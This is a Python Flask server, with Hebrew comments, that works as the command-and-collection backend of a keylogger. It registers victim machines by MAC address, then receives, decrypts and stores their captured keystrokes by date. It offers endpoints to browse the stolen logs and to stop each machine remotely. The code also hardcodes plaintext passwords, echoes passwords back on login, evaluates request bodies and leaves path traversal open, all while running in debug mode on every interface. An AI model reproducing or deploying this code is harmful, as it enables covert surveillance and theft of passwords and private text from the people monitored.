import ast
import os

from flask import Flask, render_template, Blueprint, jsonify, request, send_file
import requests
import json
import time
from flask_cors import CORS
from getmac import get_mac_address

from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt


app = Flask(__name__)
CORS(app)



# מילון דוגמה של משתמשים וסיסמאות
users = {
    "ברלה": "1234",
    "דוד": "4321",
    "שולמן": "1423"
}

# מעקב אחרי ניסיונות כושלים לכל משתמש
failed_attempts = {}

@app.route('/login', methods=['POST', 'OPTIONS'])
def login():
    # טיפול בבקשות OPTIONS (Preflight)
    if request.method == 'OPTIONS':
        return jsonify({}), 200

    data = request.get_json()
    username = data.get("username", "").strip()
    password = data.get("password", "").strip()

    # אם למשתמש כבר נרשמו 3 ניסיונות שגויים, נחסם
    if username in failed_attempts and failed_attempts[username] >= 3:
        return jsonify(False)

    # בדיקה אם המשתמש קיים במערכת
    if username in users:
        # אם הסיסמה נכונה – מחזירים את הנתונים
        if users[username] == password:
            failed_attempts[username] = 0  # איפוס נסיונות
            return jsonify({"name": username, "password": password})
        else:
            # עדכון נסיונות שגויים
            failed_attempts[username] = failed_attempts.get(username, 0) + 1
            if failed_attempts[username] >= 3:
                return jsonify(False)
            return jsonify({"name": username, "password": False})
    else:
        # המשתמש לא קיים – מחזירים שהמפתח name הוא False
        return jsonify({"name": False})





@app.route('/get_macs', methods=['GET'])
def send_macs():
    macs = [ name.replace('-', ':').replace('_info','') for name in os.listdir(r'C:\Users\User\Desktop/keylogger_data') if os.path.isdir(os.path.join(r'C:\Users\User\Desktop/keylogger_data', name))]
    return jsonify(macs), 200


@app.route('/get_by_mac', methods=['GET'])
def get_by_mac():
    mac_address = request.args['mac']
    try:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dic_mac = json.loads(f.read())
            for mac in dic_mac:
                if mac == mac_address:
                    files = os.listdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
                    return jsonify(files), 200
        return jsonify({'status':'mac not available'}), 400
    except:
        return jsonify({'status':'mac not available'}), 400


@app.route('/get_by_date', methods=['GET'])
def get_by_date():
    date = request.args.get('date')
    mac = request.args.get('mac')
    key = Decrypt.get_key(mac)
    path = fr'C:\Users\User\Desktop/keylogger_data/{mac.replace(':', '-')}_info/{date}.json'
    try:
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            file_data = f.read()
            # decrypted_data = Decrypt.decrypt_data(file_data, key)
            # print(decrypted_data,22222222222)
            return file_data
    except Exception as e:
        print(e)
        return jsonify({'status':'date not available'}), 400


@app.route('/add_data', methods=['POST'])
def add_data():
    dict_data = dict(ast.literal_eval(request.data.decode().replace("'", "\"")))
    data = dict_data['data']
    mac = dict_data['mac']
    key=Decrypt.get_key(mac)
    decrypted_data = dict(ast.literal_eval(Decrypt.decrypt_data(data,key)))
    try:
        os.mkdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
    except FileExistsError:
        try:
            with open(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info\{time.strftime('%d-%m-%Y')}.json', 'a', encoding='utf-8') as f:
                json.dump(decrypted_data, f, ensure_ascii=False)
                return jsonify({'post':'successful'}), 200
        except Exception as e:
            print(e)
    return jsonify({'post':'not successful'}), 400


@app.route('/send_mac', methods=['POST'])
def send_mac():
    ''' get the mac '''
    mac = request.data
    dict_f= {}
    ''' add the mac to all addresses file '''
    with open(r'C:\Users\User\Desktop/keylogger_data/Mac_addresses.json', 'a') as f:
        f.write(mac.decode() + '\n')
    try:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dict_f = json.loads(f.read())
    except:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
            dict_f[mac.decode()] = True
            json.dump(dict_f, f)

    return jsonify({'post':'successful'}), 200


@app.route('/check_status', methods=['GET'])
def check_status():
    mac = request.args.get('mac')
    try:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dic_status = json.loads(f.read())
            if dic_status[mac] == False:
                return jsonify({'exit':True}), 400
        return jsonify({'exit':False}), 200
    except Exception as e:
        # print(e)
        pass
    return jsonify({'exit': False}), 200


@app.route('/stop', methods=['GET'])
def stop():
    try:
        mac = request.args.get('mac')
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dic_status = json.loads(f.read())
            dic_status[mac] = False
            with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as file:
                json.dump(dic_status, file)
                print('success stop')
                return jsonify({'status':'success'}) , 200
    except:
        return jsonify({'status':'mac not available'}) , 400


app.run(debug=True, host='0.0.0.0')